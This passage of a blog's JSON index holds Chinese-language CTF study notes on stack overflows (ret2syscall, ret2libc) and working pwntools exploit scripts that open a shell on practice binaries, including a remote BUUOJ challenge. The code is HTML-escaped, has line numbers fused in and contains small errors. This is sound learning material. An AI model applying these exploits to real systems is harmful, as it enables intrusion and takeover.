覆盖的垃圾数据payload = payload + p32(system_plt) # system的地址payload = payload + b&#39;a&#39;*4 # system的返回地址payload = payload + p32(bin_sh) p.recvline(&quot;Input:&quot;)p.sendline(payload) p.interactive() ret2syscallchecksec查一下 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) IDA反编译，发现gets()读入无限制字符 gdb调试 可以看到输入的数据AAAAAAAAAA在地址0xffffd09c 的位置 计算到main的距离为108+4&#x3D;112 int 0x80(0xb,&#39;/bin/sh&#39;,0,0)执行sys_execve(“/bin/sh”,0,0) 之后是繁琐的ropper或ROPgadget的寻找过程 exp: 123456789101112131415from pwn import *io = process(&quot;./ret2syscall&quot;) //创建一个程序的进程`addr_eax = 0x080bb196 addr_edx_ecx_ebx = 0x0806eb90 addr_binsh = 0x080be408addr_int _0x80 = 0x08049421payload = flat([b&#x27;A&#x27;*112, addr_eax, 0xb, addr_edx_ecx_ebx, 0, 0, addr_binsh, addr_int_0x80])//flat函数是专门为形成payload设计的函数，它可以把列表里的每一项都转换成字节流，最后把列表里的每一项拼接起来 payload = b&#x27;A&#x27;*112 + p32(addr_eax) + p32(0xb) + p32(addr_edx_ecx_ebx) + p32(0) + p32(0) + p32(addr_binsh) + p32(addr_int_0x80)io.sendline(payload)io.interactive()","categories":[],"tags":[]},{"title":"pwn学习记录","slug":"pwn学习记录","date":"2023-08-11T08:47:57.000Z","updated":"2023-08-23T11:09:25.824Z","comments":true,"path":"2023/08/11/pwn学习记录/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/11/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"pwn学习记录常见栈溢出函数 存在strlen，可以使用\\0截断put，get函数可用libc解题控制execve的参数：eax，ebx[execve(“&#x2F;bin&#x2F;sh”,0,0) &#x3D; int 0x80(0xb,’&#x2F;bin&#x2F;sh’,0,0)]控制puts的参数：rdi ret 利用got与plt表获取部分函数地址，例如（获取put函数）： puts_plt&#x3D;elf.plt[‘puts’] puts_got&#x3D;elf.got[‘puts’] 利用ropper查询gadget的命令：ropper –file 文件名称 –search “pop eax；ret” ret2syscall： int 0x80实现系统调用：寄存器传参。 eax保存系统调用号 ebx第一个参数 ecx第三个参数 例：execve（bin&#x2F;sh,0,0）eax&#x3D;bin&#x2F;sh调用号 ebx&#x3D;0 ecx&#x3D;0 利用ropper查询pop eax，ebx，ecx，edx 利用gdb查询垃圾数据填充数：例：get到ebp的数据长度+previous ebp的4个字节 构造payload ret2libc: 在题目开启了地址随机化后，插入的shellcode的真实地址无法确定，不能直接返回到shellcode，所以需要使用retlibc来完成。 传统的ret2shellcode只覆盖了return address部分，ret2libc覆盖了return address以及其上方地址的一部分。 父函数保存了子函的参数和要返回的地址（ret address），子函数保存了父函数的参数和父函数栈底的地址（previous ebp） 可在pwndbg中查询plt与got值 在函数被调用前，got表中存入的是函数在plt表中的地址，在该函数段执行调用后，got表中存入的变为函数的真实地址 如果题目中无法找到后门函数的地址，则可以利用libc来找到system函数的地址，libc的基地址可以利用已经被调用过的函数来查找","categories":[],"tags":[]},{"title":"CTF【ciscn_2019_c_1】","slug":"第一篇文章","date":"2023-07-29T04:18:16.372Z","updated":"2023-07-29T06:09:00.802Z","comments":true,"path":"2023/07/29/第一篇文章/","link":"","permalink":"https://wuxiankwy.github.io/2023/07/29/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","excerpt":"","text":"攻击思路定向ret2libc由于程序本身并没有 system /bin/sh的调用，放弃使用ret2text和ret2syscall的想法 故我们考虑利用 ret2libc 通过已经调用过的函数去泄露它在程序中的地址，然后利用地址末尾的3个字节，去找到该程序所用的libc版本； 程序中函数的地址跟libc中函数的地址的关系： 1程序函数地址=加载程序的基址+libc中函数偏移量 构造payload1 main_addr：通过IDA64即可查看main函数的起始地址为0x400B28 pop_rdi_addr：可通过使用ROPgadget工具进行查找，可得地址为 0x400c83 1ROPgadget --binary ciscn_2019_c_1 |grep &quot;pop rdi&quot; puts_got_addr：通过ELF程序获取 elf.got[&#39;puts&#39;] puts_plt_addr：通过ELF程序获取 elf.plt[&#39;puts&#39;] 综上，我们可以构造第一段payload为(payload首部加入‘\\0’是为了绕过encrypt函数，防止输入的字符串加密而变化，strlen()函数遇‘\\0’截止)1payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 0x8) + p64(pop_got_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr) 我们通过 \\0截断了encrypt函数，但是函数仍然会执行并产生空输出； 所以我们通过puts函数输出的puts函数的地址则会在输出两行之后输出； 所以我们通过两次p.recvline()接收； 通过libc查询偏移地址两行字符串后使用puts_addr=u64(p.recvuntil(b&#39;\\n&#39;)[:-1].ljust(8,b&#39;\\0&#39;))接收puts函数的地址； 通过使用LibcSearcher查询对应的libc版本 1libc = LibcSearcher(&#x27;puts&#x27;, puts_addr) 故我们可以计算加载程序的基址，通过基址和各个函数以及字符串的偏移量可以计算各个函数以及字符串在程序中的地址 123456789101112libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)baseaddr = puts_addr-libc.dump(&#x27;puts&#x27;)print(&#x27;程序基址：&#x27; + hex(baseaddr))#/bin/sh字符串的偏移地址binsh_addr_offset = libc.dump(&#x27;str_bin_sh&#x27;) #system函数的偏移地址system_offset = libc.dump(&#x27;system&#x27;)binsh_addr = baseaddr + binsh_addr_offsetsystem_addr = baseaddr + system_offset 使用ret指令来实现堆栈平衡 构造payload212345payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(ret_addr) #堆栈平衡payload += p64(pop_rdi_addr) #将system函数的参数保存到rdi中payload += p64(binsh_addr) #pop指令的执行的操作数payload += p64(system_addr) #调用system函数获得shell Final exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;info&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29745)#p = process(&#x27;./ciscn_2019_c_1&#x27;)elf = ELF(&#x27;./ciscn_2019_c_1&#x27;)main_addr = 0x400b28pop_rdi_addr = 0x400c83ret_addr = 0x4006b9puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]p.sendlineafter(b&#x27;Input your choice!\\n&#x27;, b&#x27;1&#x27;)payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(pop_rdi_addr) payload += p64(puts_got_addr)payload += p64(puts_plt_addr)payload += p64(main_addr)p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\\n&#x27;, payload)p.recvline()p.recvline()puts_addr=u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))#puts_addr = 0x7f8685384970print(&#x27;puts函数地址：&#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)baseaddr = puts_addr-libc.dump(&#x27;puts&#x27;)print(&#x27;程序基址：&#x27; + hex(baseaddr))binsh_addr_offset = libc.dump(&#x27;str_bin_sh&#x27;) system_offset = libc.dump(&#x27;system&#x27;)binsh_addr = baseaddr + binsh_addr_offsetsystem_addr = baseaddr + system_offsetp.sendlineafter(b&#x27;Input your choice!\\n&#x27;, b&#x27;1&#x27;)payload = b&#x27;\\0&#x27; + b&#x27;a&#x27;*(0x50 - 1 + 8)payload += p64(ret_addr)payload += p64(pop_rdi_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.sendlineafter(b&#x27;Input your Plaintext to be encrypted\\n&#x27;, payload)p.interactive()","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-07-29T04:14:42.833Z","updated":"2023-07-29T04:14:42.833Z","comments":true,"path":"2023/07/29/hello-world/","link":"","permalink":"https://wuxiankwy.github.io/2023/07/29/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}